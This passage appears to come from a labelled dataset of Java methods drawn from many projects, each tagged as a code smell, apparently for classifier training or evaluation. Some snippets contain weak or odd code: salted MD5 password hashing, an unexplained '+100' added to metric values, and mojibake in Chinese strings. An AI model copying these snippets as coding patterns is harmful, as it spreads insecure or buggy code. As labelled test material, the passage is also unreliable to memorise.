    throw new ServletException(new BadRequestException(""Please provide only one of userId or email""));
  }
  if (userId == null && email == null) {
    throw new ServletException(new BadRequestException(""Please provide one of userId or email""));
  }
  try {
    AuthRecipeUserInfo user=null;
    AppIdentifier appIdentifier=getAppIdentifier(req);
    try {
      if (userId != null) {
        StorageAndUserIdMapping storageAndUserIdMapping=this.enforcePublicTenantAndGetStorageAndUserIdMappingForAppSpecificApi(req,userId,UserIdType.ANY,true);
        if (storageAndUserIdMapping.userIdMapping != null) {
          userId=storageAndUserIdMapping.userIdMapping.superTokensUserId;
        }
        user=EmailPassword.getUserUsingId(appIdentifier,storageAndUserIdMapping.storage,userId);
        if (user != null) {
          UserIdMapping.populateExternalUserIdForUsers(appIdentifier,storageAndUserIdMapping.storage,new AuthRecipeUserInfo[]{user});
        }
      }
 else {
        String normalisedEmail=Utils.normaliseEmail(email);
        TenantIdentifier tenantIdentifier=getTenantIdentifier(req);
        Storage storage=this.getTenantStorage(req);
        user=EmailPassword.getUserUsingEmail(tenantIdentifier,storage,normalisedEmail);
        if (user != null) {
          UserIdMapping.populateExternalUserIdForUsers(appIdentifier,storage,new AuthRecipeUserInfo[]{user});
        }
      }
    }
 catch (    UnknownUserIdException e) {
    }
    if (user == null) {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",userId != null ? ""UNKNOWN_USER_ID_ERROR"" : ""UNKNOWN_EMAIL_ERROR"");
      super.sendJsonResponse(200,result,resp);
    }
 else {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",""OK"");
      JsonObject userJson=getVersionFromRequest(req).greaterThanOrEqualTo(SemVer.v4_0) ? user.toJson() : user.toJsonWithoutAccountLinking();
      if (getVersionFromRequest(req).lesserThan(SemVer.v3_0)) {
        userJson.remove(""tenantIds"");
      }
      result.add(""user"",userJson);
      super.sendJsonResponse(200,result,resp);
    }
  }
 catch (  StorageQueryException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
}",1,Code Smell
"private void startRecording(boolean byLongPress,Runnable whenStarted){
  if (cameraView == null) {
    return;
  }
  CameraController.getInstance().recordVideo(cameraView.getCameraSessionObject(),outputFile,false,(thumbPath,duration) -> {
    if (recordControl != null) {
      recordControl.stopRecordingLoading(true);
    }
    if (useDisplayFlashlight()) {
      flashViews.flashOut();
    }
    if (outputFile == null || cameraView == null) {
      return;
    }
    takingVideo=false;
    stoppingTakingVideo=false;
    if (duration <= 800) {
      animateRecording(false,true);
      setAwakeLock(false);
      videoTimerView.setRecording(false,true);
      if (recordControl != null) {
        recordControl.stopRecordingLoading(true);
      }
      try {
        outputFile.delete();
        outputFile=null;
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      if (thumbPath != null) {
        try {
          new File(thumbPath).delete();
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      return;
    }
    showVideoTimer(false,true);
    outputEntry=StoryEntry.fromVideoShoot(outputFile,thumbPath,duration);
    StoryPrivacySelector.applySaved(currentAccount,outputEntry);
    fromGallery=false;
    int width=cameraView.getVideoWidth(), height=cameraView.getVideoHeight();
    if (width > 0 && height > 0) {
      outputEntry.width=width;
      outputEntry.height=height;
      outputEntry.setupMatrix();
    }
    navigateToPreviewWithPlayerAwait(() -> {
      navigateTo(PAGE_PREVIEW,true);
    }
,0);
  }
,() -> {
    whenStarted.run();
    hintTextView.setText(byLongPress ? LocaleController.getString(""StoryHintSwipeToZoom"",R.string.StoryHintSwipeToZoom) : LocaleController.getString(""StoryHintPinchToZoom"",R.string.StoryHintPinchToZoom),false);
    animateRecording(true,true);
    setAwakeLock(true);
    videoTimerView.setRecording(true,true);
    showVideoTimer(true,true);
  }
,cameraView,true);
  if (!isVideo) {
    isVideo=true;
    showVideoTimer(isVideo,true);
    modeSwitcherView.switchMode(isVideo);
    recordControl.startAsVideo(isVideo);
  }
}",1,Code Smell
"/** 
 * Reads segment metadata, and populates a list of columns and metrics. 
 */
void metadata(String dataSourceName,String timestampColumnName,List<Interval> intervals,Map<String,SqlTypeName> fieldBuilder,Set<String> metricNameBuilder,Map<String,List<ComplexMetric>> complexMetrics){
  final String url=this.url + ""/druid/v2/?pretty"";
  final Map<String,String> requestHeaders=ImmutableMap.of(""Content-Type"",""application/json"");
  final String data=DruidQuery.metadataQuery(dataSourceName,intervals);
  try (InputStream in0=post(url,data,requestHeaders,10000,1800000);InputStream in=traceResponse(in0)){
    final ObjectMapper mapper=new ObjectMapper().configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
    final CollectionType listType=mapper.getTypeFactory().constructCollectionType(List.class,JsonSegmentMetadata.class);
    final List<JsonSegmentMetadata> list=mapper.readValue(in,listType);
    in.close();
    fieldBuilder.put(timestampColumnName,SqlTypeName.TIMESTAMP_WITH_LOCAL_TIME_ZONE);
    for (    JsonSegmentMetadata o : list) {
      for (      Map.Entry<String,JsonColumn> entry : o.columns.entrySet()) {
        if (entry.getKey().equals(DruidTable.DEFAULT_TIMESTAMP_COLUMN)) {
          continue;
        }
        final DruidType druidType;
        try {
          druidType=DruidType.getTypeFromMetaData(entry.getValue().type);
        }
 catch (        AssertionError e) {
          continue;
        }
        fieldBuilder.put(entry.getKey(),druidType.sqlType);
      }
      if (o.aggregators != null) {
        for (        Map.Entry<String,JsonAggregator> entry : o.aggregators.entrySet()) {
          if (!fieldBuilder.containsKey(entry.getKey())) {
            continue;
          }
          DruidType type=DruidType.getTypeFromMetaData(entry.getValue().type);
          if (type.isComplex()) {
            List<ComplexMetric> metricList=new ArrayList<>();
            metricList.add(new ComplexMetric(entry.getKey(),type));
            complexMetrics.put(entry.getKey(),metricList);
          }
 else {
            metricNameBuilder.add(entry.getKey());
          }
        }
      }
    }
  }
 catch (  IOException e) {
    throw new RuntimeException(e);
  }
}",1,Code Smell
"private boolean scrollInternal(float dx,float dy,boolean fling,float x,float y){
  if (mPages.size() <= 0) {
    return false;
  }
  GalleryView galleryView=mGalleryView;
  int width=galleryView.getWidth();
  int height=galleryView.getHeight();
  int pageWidth=(int)(width * mScale);
  final float reservation=getReservation();
  boolean requestFill=false;
  boolean result=false;
  int margin=pageWidth - width;
  int dxInt=(int)dx;
  if (margin > 0 && 0 != dxInt) {
    int oldOffsetX=mOffsetX;
    int exceptOffsetX=oldOffsetX - dxInt;
    mOffsetX=MathUtils.clamp(exceptOffsetX,-margin,0);
    if (mOffsetX != oldOffsetX) {
      requestFill=true;
    }
  }
  int remainY=(int)dy;
  while (remainY != 0) {
    if (remainY < 0) {
      int limit;
      if (mIndex > 0) {
        limit=(int)(-height * reservation) + mInterval;
      }
 else {
        limit=0;
      }
      if (mOffsetY - remainY <= limit) {
        mOffsetY-=remainY;
        remainY=0;
        requestFill=true;
        mDeltaX=0;
        mDeltaY=0;
      }
 else {
        if (mIndex > 0) {
          mOffsetY=limit;
          remainY=remainY + limit - mOffsetY;
          ++mOffsetY;
          ++remainY;
          galleryView.forceFill();
          requestFill=false;
          mDeltaX=0;
          mDeltaY=0;
        }
 else {
          if (mOffsetY != limit) {
            mOffsetY=limit;
            requestFill=true;
          }
          if (!fling) {
            overScrollEdge(0,remainY + limit - mOffsetY,x,y);
          }
          remainY=0;
          result=true;
        }
      }
    }
 else {
      getBottomState();
      int bottom=mBottomStateBottom;
      boolean hasNext=mBottomStateHasNext;
      int limit;
      if (hasNext) {
        limit=(int)(height * (1 + reservation)) - mInterval;
      }
 else {
        limit=height;
      }
      limit=Math.min(bottom,limit);
      if (bottom - remainY >= limit) {
        mOffsetY-=remainY;
        remainY=0;
        requestFill=true;
        mDeltaX=0;
        mDeltaY=0;
      }
 else {
        if (hasNext) {
          mOffsetY-=bottom - limit;
          remainY=remainY + limit - bottom;
          --mOffsetY;
          --remainY;
          galleryView.forceFill();
          requestFill=false;
          mDeltaX=0;
          mDeltaY=0;
        }
 else {
          if (mOffsetY != limit) {
            mOffsetY-=bottom - limit;
            requestFill=true;
          }
          if (!fling) {
            overScrollEdge(0,remainY + limit - bottom,x,y);
          }
          remainY=0;
          result=true;
        }
      }
    }
  }
  if (requestFill) {
    mGalleryView.requestFill();
  }
  return result;
}",1,Code Smell
"private void processClientBalanceMetaInfo(long balanceId,StringBuilder sBuffer){
  int curDoingTasks=this.curCltBalanceParal.get();
  if (curDoingTasks > 0) {
    logger.info(sBuffer.append(""[Clt-Balance Status] "").append(balanceId).append("" the Client-Balance has "").append(curDoingTasks).append("" task(s) in progress!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return;
  }
  List<String> clientGroups=consumerHolder.getAllClientBalanceGroups();
  if (!clientGroups.isEmpty()) {
    int balanceTaskCnt=clientGroups.size();
    int unitNum=(balanceTaskCnt + masterConfig.getRebalanceParallel() - 1) / masterConfig.getRebalanceParallel();
    int startIndex=0;
    int endIndex=0;
    curCltBalanceParal.set(masterConfig.getRebalanceParallel());
    for (int i=0; i < masterConfig.getRebalanceParallel(); i++) {
      startIndex=Math.min((i) * unitNum,balanceTaskCnt);
      endIndex=Math.min((i + 1) * unitNum,balanceTaskCnt);
      final List<String> subGroups=clientGroups.subList(startIndex,endIndex);
      if (subGroups.isEmpty()) {
        curCltBalanceParal.decrementAndGet();
        continue;
      }
      this.cltExecutor.execute(new Runnable(){
        @Override public void run(){
          try {
            if (subGroups.isEmpty()) {
              return;
            }
            ConsumeGroupInfo consumeGroupInfo;
            StringBuilder sBuffer2=new StringBuilder(512);
            for (            String groupName : subGroups) {
              consumeGroupInfo=consumerHolder.getConsumeGroupInfo(groupName);
              if (consumeGroupInfo == null) {
                continue;
              }
              freshTopicMetaInfo(consumeGroupInfo,sBuffer2);
            }
          }
 catch (          Throwable e) {
            logger.warn(""[Clt-Balance Status] Error during process"",e);
          }
 finally {
            curCltBalanceParal.decrementAndGet();
          }
        }
      }
);
    }
  }
}",1,Code Smell
"@Override protected void setColumnWidth(WriteSheetHolder writeSheetHolder,List<WriteCellData<?>> cellDataList,Cell cell,Head head,Integer integer,Boolean isHead){
  boolean needSetWidth=isHead || !CollectionUtils.isEmpty(cellDataList);
  if (needSetWidth) {
    Map<Integer,Integer> maxColumnWidthMap=CACHE.computeIfAbsent(writeSheetHolder.getSheetName(),k -> new HashMap<>(0));
    Integer columnWidth=this.dataLength(cellDataList,cell,isHead);
    if (columnWidth >= 0) {
      if (columnWidth > 119) {
        columnWidth=120;
      }
      Integer maxColumnWidth=maxColumnWidthMap.get(cell.getColumnIndex());
      if (maxColumnWidth == null || columnWidth > maxColumnWidth) {
        maxColumnWidthMap.put(cell.getColumnIndex(),columnWidth);
        Sheet sheet=writeSheetHolder.getSheet();
        sheet.setColumnWidth(cell.getColumnIndex(),Math.min(Double.valueOf(columnWidth * 256 * 1.8).intValue(),16384));
      }
    }
  }
}",1,Code Smell
"public void allFilesSelcetedByType(int type,boolean selected){
  ArrayList<FileInfo> files=null;
  if (type == CacheControlActivity.TYPE_PHOTOS) {
    files=media;
    allPhotosSelected=selected;
  }
 else   if (type == CacheControlActivity.TYPE_VIDEOS) {
    files=media;
    allVideosSelected=selected;
  }
 else   if (type == CacheControlActivity.TYPE_DOCUMENTS) {
    files=documents;
    allDocumentsSelected=selected;
  }
 else   if (type == CacheControlActivity.TYPE_MUSIC) {
    files=music;
    allMusicSelected=selected;
  }
 else   if (type == CacheControlActivity.TYPE_VOICE) {
    files=voice;
    allVoiceSelected=selected;
  }
  if (files != null) {
    for (int i=0; i < files.size(); i++) {
      if (files.get(i).type == type) {
        if (selected) {
          if (!selectedFiles.contains(files.get(i))) {
            selectedFiles.add(files.get(i));
            incSize(files.get(i),true);
          }
        }
 else {
          if (selectedFiles.contains(files.get(i))) {
            selectedFiles.remove(files.get(i));
            incSize(files.get(i),false);
          }
        }
      }
    }
  }
}",1,Code Smell
"@NonNull public static String getReadableString(@NonNull Throwable e){
  e.printStackTrace();
  if (e instanceof MalformedURLException) {
    return GetText.getString(R.string.error_invalid_url);
  }
 else   if (e instanceof ConnectTimeoutException || e instanceof SocketTimeoutException) {
    return GetText.getString(R.string.error_timeout);
  }
 else   if (e instanceof UnknownHostException) {
    return GetText.getString(R.string.error_unknown_host);
  }
 else   if (e instanceof StatusCodeException) {
    StatusCodeException sce=(StatusCodeException)e;
    StringBuilder sb=new StringBuilder();
    sb.append(GetText.getString(R.string.error_bad_status_code,sce.getResponseCode()));
    if (sce.isIdentifiedResponseCode()) {
      sb.append("", "").append(sce.getMessage());
    }
    return sb.toString();
  }
 else   if (e instanceof ProtocolException && e.getMessage() != null && e.getMessage().startsWith(""Too many follow-up requests:"")) {
    return GetText.getString(R.string.error_redirection);
  }
 else   if (e instanceof ProtocolException || e instanceof SocketException || e instanceof SSLException) {
    return GetText.getString(R.string.error_socket);
  }
 else   if (e instanceof EhException) {
    return """" + e.getMessage();
  }
 else {
    if (e.getLocalizedMessage() == null) {
      return """" + e.getMessage();
    }
    if (e.getLocalizedMessage().equals(e.getMessage())) {
      return e.getLocalizedMessage();
    }
    return e.getLocalizedMessage() + ""\n"" + e.getMessage();
  }
}
",1,Code Smell
"public Void visit(SqlIdentifier id){
  if (isGroupExpr(id) || id.isStar()) {
    return null;
  }
  final SqlCall call=validator.makeNullaryCall(id);
  if (call != null) {
    return call.accept(this);
  }
  final SqlQualified fqId=scopes.peek().fullyQualify(id);
  if (isGroupExpr(fqId.identifier)) {
    return null;
  }
  SqlNode originalExpr=validator.getOriginal(id);
  final String exprString=originalExpr.toString();
  throw validator.newValidationError(originalExpr,distinct ? RESOURCE.notSelectDistinctExpr(exprString) : RESOURCE.notGroupExpr(exprString));
}
public Void visit(SqlCall call){
  final SqlValidatorScope scope=scopes.peek();
  if (call.getOperator().isAggregator()) {
    if (distinct) {
      if (scope instanceof AggregatingSelectScope) {
        SqlNodeList selectList=((SqlSelect)scope.getNode()).getSelectList();
        for (        SqlNode sqlNode : selectList) {
          if (sqlNode.getKind() == SqlKind.AS) {
            sqlNode=((SqlCall)sqlNode).operand(0);
          }
          if (validator.expand(sqlNode,scope).equalsDeep(call,Litmus.IGNORE)) {
            return null;
          }
        }
      }
      SqlNode originalExpr=validator.getOriginal(call);
      final String exprString=originalExpr.toString();
      throw validator.newValidationError(call,RESOURCE.notSelectDistinctExpr(exprString));
    }
    return null;
  }
switch (call.getKind()) {
case FILTER:
case WITHIN_GROUP:
case RESPECT_NULLS:
case IGNORE_NULLS:
    call.operand(0).accept(this);
  return null;
}
if (call.getKind() == SqlKind.OVER) {
for (SqlNode operand : call.<SqlCall>operand(0).getOperandList()) {
  operand.accept(this);
}
final SqlNode over=call.operand(1);
if (over instanceof SqlCall) {
  over.accept(this);
}
 else if (over instanceof SqlIdentifier) {
  final SqlWindow window=scope.lookupWindow(((SqlIdentifier)over).getSimple());
  window.getPartitionList().accept(this);
  window.getOrderList().accept(this);
}
}
if (isGroupExpr(call)) {
return null;
}
final SqlCall groupCall=SqlStdOperatorTable.convertAuxiliaryToGroupCall(call);
if (groupCall != null) {
if (isGroupExpr(groupCall)) {
  return null;
}
throw validator.newValidationError(groupCall,RESOURCE.auxiliaryWithoutMatchingGroupCall(call.getOperator().getName(),groupCall.getOperator().getName()));
}
if (call.isA(SqlKind.QUERY)) {
return null;
}
SqlValidatorScope newScope=scope.getOperandScope(call);
scopes.push(newScope);
call.getOperator().acceptCall(this,call,true,ArgHandlerImpl.instance());
scopes.pop();
return null;
}",1,Code Smell
"/** 
 * Given the equi-column predicates of the source and the target and the computed equivalence classes, it extracts possible mappings between the equivalence classes. <p>If there is no mapping, it returns null. If there is a exact match, it will return a compensation predicate that evaluates to true. Finally, if a compensation predicate needs to be enforced on top of the target to make the equivalences classes match, it returns that compensation predicate.
 */
private static RexNode generateEquivalenceClasses(RexBuilder rexBuilder,EquivalenceClasses sourceEC,EquivalenceClasses targetEC){
  if (sourceEC.getEquivalenceClasses().isEmpty() && targetEC.getEquivalenceClasses().isEmpty()) {
    return rexBuilder.makeLiteral(true);
  }
  if (sourceEC.getEquivalenceClasses().isEmpty() && !targetEC.getEquivalenceClasses().isEmpty()) {
    return null;
  }
  final List<Set<RexTableInputRef>> sourceEquivalenceClasses=sourceEC.getEquivalenceClasses();
  final List<Set<RexTableInputRef>> targetEquivalenceClasses=targetEC.getEquivalenceClasses();
  final Multimap<Integer,Integer> mapping=extractPossibleMapping(sourceEquivalenceClasses,targetEquivalenceClasses);
  if (mapping == null) {
    return null;
  }
  RexNode compensationPredicate=rexBuilder.makeLiteral(true);
  for (int i=0; i < sourceEquivalenceClasses.size(); i++) {
    if (!mapping.containsKey(i)) {
      Iterator<RexTableInputRef> it=sourceEquivalenceClasses.get(i).iterator();
      RexTableInputRef e0=it.next();
      while (it.hasNext()) {
        RexNode equals=rexBuilder.makeCall(SqlStdOperatorTable.EQUALS,e0,it.next());
        compensationPredicate=rexBuilder.makeCall(SqlStdOperatorTable.AND,compensationPredicate,equals);
      }
    }
 else {
      for (      int j : mapping.get(i)) {
        Set<RexTableInputRef> difference=new HashSet<>(sourceEquivalenceClasses.get(i));
        difference.removeAll(targetEquivalenceClasses.get(j));
        for (        RexTableInputRef e : difference) {
          RexNode equals=rexBuilder.makeCall(SqlStdOperatorTable.EQUALS,e,targetEquivalenceClasses.get(j).iterator().next());
          compensationPredicate=rexBuilder.makeCall(SqlStdOperatorTable.AND,compensationPredicate,equals);
        }
      }
    }
  }
  return compensationPredicate;
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public List<String> tokenize(String sentence){
  StringBuilder sb=new StringBuilder();
  List<String> subTokens=new ArrayList<>();
  List<String> outputTokens=new ArrayList<>();
  for (  String token : super.tokenize(sentence.trim())) {
    char[] chars=token.toCharArray();
    if (chars.length > maxInputChars) {
      outputTokens.add(unknown);
      continue;
    }
    boolean isBad=false;
    int start=0;
    subTokens.clear();
    String currentSubString=null;
    while (start < chars.length) {
      int end=chars.length;
      while (start < end) {
        sb.setLength(0);
        sb.append(token,start,end);
        if (start > 0) {
          sb.insert(0,""##"");
        }
        String subString=sb.toString();
        if (vocabulary.contains(subString)) {
          currentSubString=subString;
          break;
        }
 else {
          currentSubString=null;
        }
        end--;
      }
      if (currentSubString == null) {
        isBad=true;
        break;
      }
      subTokens.add(currentSubString);
      if (subTokens.size() > maxInputChars) {
        throw new IllegalStateException(""Too many subTokens for: '"" + sentence + '\'');
      }
      start=end;
    }
    if (isBad) {
      outputTokens.add(unknown);
    }
 else {
      outputTokens.addAll(subTokens);
    }
  }
  return outputTokens;
}",1,Code Smell
"private List<EventListenerMetadataGenerator> processBean(String beanName,Class<?> targetType){
  List<EventListenerMetadataGenerator> result=new ArrayList<>();
  if (AnnotationUtils.isCandidateClass(targetType,EventListener.class)) {
    Map<Method,EventListener> annotatedMethods=null;
    try {
      annotatedMethods=MethodIntrospector.selectMethods(targetType,(MethodIntrospector.MetadataLookup<EventListener>)(method) -> AnnotatedElementUtils.findMergedAnnotation(method,EventListener.class));
    }
 catch (    Throwable ex) {
      if (logger.isDebugEnabled()) {
        logger.debug(""Could not resolve methods for bean with name '"" + beanName + ""'"",ex);
      }
    }
    if (CollectionUtils.isEmpty(annotatedMethods)) {
      if (logger.isTraceEnabled()) {
        logger.trace(""No @EventListener annotations found on bean class: "" + targetType.getName());
      }
    }
 else {
      for (      Method method : annotatedMethods.keySet()) {
        for (        Entry<String,EventListenerFactory> entry : this.eventListenerFactories.entrySet()) {
          if (entry.getValue().supportsMethod(method)) {
            String factoryBeanName=(!entry.getKey().equals(AnnotationConfigUtils.EVENT_LISTENER_FACTORY_BEAN_NAME)) ? entry.getKey() : null;
            result.add(new EventListenerMetadataGenerator(beanName,targetType,method,factoryBeanName));
            break;
          }
        }
      }
      if (logger.isDebugEnabled()) {
        logger.debug(annotatedMethods.size() + "" @EventListener methods processed on bean '"" + beanName+ ""': ""+ annotatedMethods);
      }
    }
  }
  return result;
}
",1,Code Smell
"@Override public void snapshot(String domain,List<MetricItemValue> itemValues){
  for (  MetricItemValue itemValue : itemValues) {
    String key=itemValue.getKey();
    LOGGER.info(""KEY : "" + key);
    Map<String,MetricValue> metricMap=itemValue.getMetrics();
    for (    Entry<String,MetricValue> entry : itemValue.getMetrics().entrySet()) {
      String fieldName=entry.getValue().name;
      AtomicLong metricValue=metricValueMap.get(fieldName);
      if (metricValue != null) {
        long fieldValue=entry.getValue().value;
        metricValue.addAndGet(fieldValue);
        metricValue.addAndGet(100);
      }
    }
    String dimensionKey=itemValue.getKey();
    MetricItemValue dimensionMetricValue=dimensionMetricValueMap.get(dimensionKey);
    if (dimensionMetricValue == null) {
      dimensionMetricValue=new MetricItemValue(dimensionKey,new ConcurrentHashMap<String,String>(),new ConcurrentHashMap<String,MetricValue>());
      dimensionMetricValueMap.putIfAbsent(dimensionKey,dimensionMetricValue);
      dimensionMetricValue=dimensionMetricValueMap.get(dimensionKey);
      dimensionMetricValue.getDimensions().putAll(itemValue.getDimensions());
      for (      Entry<String,String> entry : itemValue.getDimensions().entrySet()) {
        if (!dimensionKeys.contains(entry.getKey())) {
          dimensionKeys.add(entry.getKey());
        }
      }
    }
    for (    Entry<String,MetricValue> entry : itemValue.getMetrics().entrySet()) {
      String fieldName=entry.getValue().name;
      MetricValue metricValue=dimensionMetricValue.getMetrics().get(fieldName);
      if (metricValue == null) {
        metricValue=MetricValue.of(fieldName,entry.getValue().value);
        dimensionMetricValue.getMetrics().put(metricValue.name,metricValue);
        continue;
      }
      metricValue.value+=entry.getValue().value;
    }
  }
}",1,Code Smell
"/** 
 * 涓轰簡鎵嬫満娉ㄥ唽
 * @param loginByPhone
 * @param bindingResult
 * @param request
 * @return
 * @throws Exception
 */
@RequestMapping(""/register/for_phone"") @ResponseBody @Transactional(rollbackFor=Exception.class) public MessageResult loginByPhone4Mobile(@Valid LoginByPhone loginByPhone,BindingResult bindingResult,HttpServletRequest request) throws Exception {
  MessageResult result=BindingResultUtil.validate(bindingResult);
  if (result != null) {
    return result;
  }
  if (loginByPhone.getCountry().equals(""涓浗"")) {
    Assert.isTrue(ValidateUtil.isMobilePhone(loginByPhone.getPhone().trim()),localeMessageSourceService.getMessage(""PHONE_EMPTY_OR_INCORRECT""));
  }
  String ip=request.getHeader(""X-Real-IP"");
  String phone=loginByPhone.getPhone();
  ValueOperations valueOperations=redisTemplate.opsForValue();
  Object code=valueOperations.get(SysConstant.PHONE_REG_CODE_PREFIX + phone);
  isTrue(!memberService.phoneIsExist(phone),localeMessageSourceService.getMessage(""PHONE_ALREADY_EXISTS""));
  isTrue(!memberService.usernameIsExist(loginByPhone.getUsername()),localeMessageSourceService.getMessage(""USERNAME_ALREADY_EXISTS""));
  if (StringUtils.hasText(loginByPhone.getPromotion().trim())) {
    isTrue(memberService.userPromotionCodeIsExist(loginByPhone.getPromotion()),localeMessageSourceService.getMessage(""USER_PROMOTION_CODE_EXISTS""));
  }
  notNull(code,localeMessageSourceService.getMessage(""VERIFICATION_CODE_NOT_EXISTS""));
  if (!code.toString().equals(loginByPhone.getCode())) {
    return error(localeMessageSourceService.getMessage(""VERIFICATION_CODE_INCORRECT""));
  }
 else {
    valueOperations.getOperations().delete(SysConstant.PHONE_REG_CODE_PREFIX + phone);
  }
  String loginNo=String.valueOf(idWorkByTwitter.nextId());
  String credentialsSalt=ByteSource.Util.bytes(loginNo).toHex();
  String password=Md5.md5Digest(loginByPhone.getPassword() + credentialsSalt).toLowerCase();
  Member member=new Member();
  if (!StringUtils.isEmpty(loginByPhone.getSuperPartner())) {
    member.setSuperPartner(loginByPhone.getSuperPartner());
    if (!""0"".equals(loginByPhone.getSuperPartner())) {
      member.setStatus(CommonStatus.ILLEGAL);
    }
  }
  member.setMemberLevel(MemberLevelEnum.GENERAL);
  Location location=new Location();
  location.setCountry(loginByPhone.getCountry());
  Country country=new Country();
  country.setZhName(loginByPhone.getCountry());
  member.setCountry(country);
  member.setLocation(location);
  member.setUsername(loginByPhone.getUsername());
  member.setPassword(password);
  member.setMobilePhone(phone);
  member.setSalt(credentialsSalt);
  Member member1=memberService.save(member);
  if (member1 != null) {
    member1.setPromotionCode(GeneratorUtil.getPromotionCode(member1.getId()));
    memberEvent.onRegisterSuccess(member1,loginByPhone.getPromotion());
    return success(localeMessageSourceService.getMessage(""REGISTRATION_SUCCESS""));
  }
 else {
    return error(localeMessageSourceService.getMessage(""REGISTRATION_FAILED""));
  }
}",1,Code Smell
"private static void drawLotteryPlus(JSONObject lotteryPlusInfo){
  try {
    if (!lotteryPlusInfo.has(""userSevenDaysGiftsItem""))     return;
    String itemId=lotteryPlusInfo.getString(""itemId"");
    JSONObject jo=lotteryPlusInfo.getJSONObject(""userSevenDaysGiftsItem"");
    JSONArray ja=jo.getJSONArray(""userEverydayGiftItems"");
    for (int i=0; i < ja.length(); i++) {
      jo=ja.getJSONObject(i);
      if (jo.getString(""itemId"").equals(itemId)) {
        if (!jo.getBoolean(""received"")) {
          jo=new JSONObject(AntOrchardRpcCall.drawLottery());
          if (""100"".equals(jo.getString(""resultCode""))) {
            JSONArray userEverydayGiftItems=jo.getJSONObject(""lotteryPlusInfo"").getJSONObject(""userSevenDaysGiftsItem"").getJSONArray(""userEverydayGiftItems"");
            for (int j=0; j < userEverydayGiftItems.length(); j++) {
              jo=userEverydayGiftItems.getJSONObject(j);
              if (jo.getString(""itemId"").equals(itemId)) {
                int awardCount=jo.optInt(""awardCount"",1);
                Log.farm(""涓冩棩绀煎寘馃巵[鑾峰緱鑲ユ枡]#"" + awardCount + ""g"");
                break;
              }
            }
          }
 else {
            Log.i(jo.getString(""resultDesc""),jo.toString());
          }
        }
 else {
          Log.recordLog(""涓冩棩绀煎寘宸查鍙�"","""");
        }
        break;
      }
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""drawLotteryPlus err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * @since 2 
 */
protected Object applyStyleProperty(String key,Object value){
  if (key.startsWith(""icon."") || key.equals(""selectionForeground"")) {
    if (iconsShared) {
      if (checkIcon instanceof FlatCheckBoxMenuItemIcon)       checkIcon=FlatStylingSupport.cloneIcon(checkIcon);
      if (arrowIcon instanceof FlatMenuArrowIcon)       arrowIcon=FlatStylingSupport.cloneIcon(arrowIcon);
      iconsShared=false;
    }
    if (key.startsWith(""icon."")) {
      String key2=key.substring(""icon."".length());
      try {
        if (checkIcon instanceof FlatCheckBoxMenuItemIcon)         return ((FlatCheckBoxMenuItemIcon)checkIcon).applyStyleProperty(key2,value);
      }
 catch (      UnknownStyleException ex) {
      }
      try {
        if (arrowIcon instanceof FlatMenuArrowIcon)         return ((FlatMenuArrowIcon)arrowIcon).applyStyleProperty(key2,value);
      }
 catch (      UnknownStyleException ex) {
      }
      throw new UnknownStyleException(key);
    }
 else     if (key.equals(""selectionForeground"")) {
      if (checkIcon instanceof FlatCheckBoxMenuItemIcon)       ((FlatCheckBoxMenuItemIcon)checkIcon).applyStyleProperty(key,value);
      if (arrowIcon instanceof FlatMenuArrowIcon)       ((FlatMenuArrowIcon)arrowIcon).applyStyleProperty(key,value);
      throw new UnknownStyleException(key);
    }
  }
  return FlatStylingSupport.applyToAnnotatedObject(this,key,value);
}",1,Code Smell
"@Override public List<MenuVo> buildMenus(List<MenuDto> menuDtos){
  List<MenuVo> list=new LinkedList<>();
  menuDtos.forEach(menuDTO -> {
    if (menuDTO != null) {
      List<MenuDto> menuDtoList=menuDTO.getChildren();
      MenuVo menuVo=new MenuVo();
      menuVo.setName(ObjectUtil.isNotEmpty(menuDTO.getComponentName()) ? menuDTO.getComponentName() : menuDTO.getTitle());
      menuVo.setPath(menuDTO.getPid() == null ? ""/"" + menuDTO.getPath() : menuDTO.getPath());
      menuVo.setHidden(menuDTO.getHidden());
      if (!menuDTO.getIFrame()) {
        if (menuDTO.getPid() == null) {
          menuVo.setComponent(StringUtils.isEmpty(menuDTO.getComponent()) ? ""Layout"" : menuDTO.getComponent());
        }
 else         if (menuDTO.getType() == 0) {
          menuVo.setComponent(StringUtils.isEmpty(menuDTO.getComponent()) ? ""ParentView"" : menuDTO.getComponent());
        }
 else         if (StringUtils.isNoneBlank(menuDTO.getComponent())) {
          menuVo.setComponent(menuDTO.getComponent());
        }
      }
      menuVo.setMeta(new MenuMetaVo(menuDTO.getTitle(),menuDTO.getIcon(),!menuDTO.getCache()));
      if (CollectionUtil.isNotEmpty(menuDtoList)) {
        menuVo.setAlwaysShow(true);
        menuVo.setRedirect(""noredirect"");
        menuVo.setChildren(buildMenus(menuDtoList));
      }
 else       if (menuDTO.getPid() == null) {
        MenuVo menuVo1=new MenuVo();
        menuVo1.setMeta(menuVo.getMeta());
        if (!menuDTO.getIFrame()) {
          menuVo1.setPath(""index"");
          menuVo1.setName(menuVo.getName());
          menuVo1.setComponent(menuVo.getComponent());
        }
 else {
          menuVo1.setPath(menuDTO.getPath());
        }
        menuVo.setName(null);
        menuVo.setMeta(null);
        menuVo.setComponent(""Layout"");
        List<MenuVo> list1=new ArrayList<>();
        list1.add(menuVo1);
        menuVo.setChildren(list1);
      }
      list.add(menuVo);
    }
  }
);
  return list;
}",1,Code Smell
"/** 
 * Computes the distance between this vector and the other vector.
 * @param other The other vector.
 * @param transformFunc The transformation function to apply to each paired dimension difference.
 * @param normalizeFunc The normalization to apply after summing the transformed differences.
 * @return The distance between the two vectors.
 */
public double distance(SGDVector other,DoubleUnaryOperator transformFunc,DoubleUnaryOperator normalizeFunc){
  if (other.size() != size) {
    throw new IllegalArgumentException(""Can't measure the distance between two vectors of different lengths, this = "" + size + "", other = ""+ other.size());
  }
  double score=0.0;
  if ((other.numActiveElements() != 0) && (indices.length != 0)) {
    Iterator<VectorTuple> itr=iterator();
    Iterator<VectorTuple> otherItr=other.iterator();
    VectorTuple tuple=itr.next();
    VectorTuple otherTuple=otherItr.next();
